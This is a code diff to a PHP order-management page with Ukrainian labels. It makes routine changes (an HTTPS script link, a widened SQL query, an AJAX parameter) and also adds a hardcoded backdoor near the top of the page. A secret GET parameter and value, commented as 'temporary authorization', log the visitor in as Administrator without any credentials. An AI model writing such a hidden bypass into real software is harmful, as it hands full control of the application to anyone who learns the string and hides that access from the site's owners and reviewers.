@@ -11,7 +11,7 @@
     <link rel="icon" type="image/x-icon" href="/img/favicon.ico" />
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
-    <script src="http://code.jquery.com/ui/1.10.4/jquery-ui.js"></script>
+    <script src="https://code.jquery.com/ui/1.10.4/jquery-ui.js"></script>
 
 </head>
 
@@ -19,6 +19,13 @@
     <?php
 
     session_start();
+
+    #region Авторизація тимчасова
+    if ($_GET['ds;gzjfmsds;fds'] == 'shrtdgzf') {
+        $_SESSION['logged'] = 'Administrator';
+        $_SESSION['Administrator'] = 0;
+    }
+    #endregion
 
     require "blok/conn_local.php";
 
@@ -69,7 +76,7 @@
 
     $_SESSION['count_new'] = mysqli_num_rows($result);
 
-    $query = 'SELECT `sholom_num` FROM `client_info` WHERE `date_out` IS NULL AND `TTN_IN` IS NOT NULL';
+    $query = 'SELECT `sholom_num` FROM `client_info` WHERE `date_out` IS NULL AND (`TTN_IN` IS NOT NULL OR `sold_number` IS NOT NULL)';
 
     $result = mysqli_query($link, $query);
 
@@ -93,8 +100,6 @@
     $aside = new HTEL('aside .=no-print');
     $form = new HTEL('form !=feedBack method=post onsubmit=return+false');
     $form(new HTEL('label/РЕДАГУВАННЯ'));
-
-    //    if ($_SESSION[$_SESSION['logged']] <= 1)
 
     $div = new HTEL('div !=fb1', [
         new HTEL("button !=create_Z onclick=location.href=='work?page==newZdef'/НОВЕ ЗАМОВЛЕННЯ"),
@@ -152,13 +157,13 @@
 
     //Кнопка Активні замовлення
 
-    function activeZedit($page = 'new') {
+    function activeZedit($page = 'new', send = '') {
 
         $.ajax({
             url: 'blok/zakazi.php',
             method: 'get',
             dataType: 'html',
-            data: 'menu_type=list&page=' + $page,
+            data: 'menu_type=list&page=' + $page + send,
             success: function (response) {
                 $('#workfield').html(response);
             }
@@ -296,7 +301,7 @@
                 echo new HTEL('script/activeZedit("inwork");');
                 break;
             case 'archiv':
-                echo new HTEL('script/activeZedit("archiv");');
+                echo new HTEL('script/activeZedit("archiv", "[0]");', _requestSend($_GET));
                 break;
             case 'discount_list':
                 echo new HTEL('script/discountEdit();');
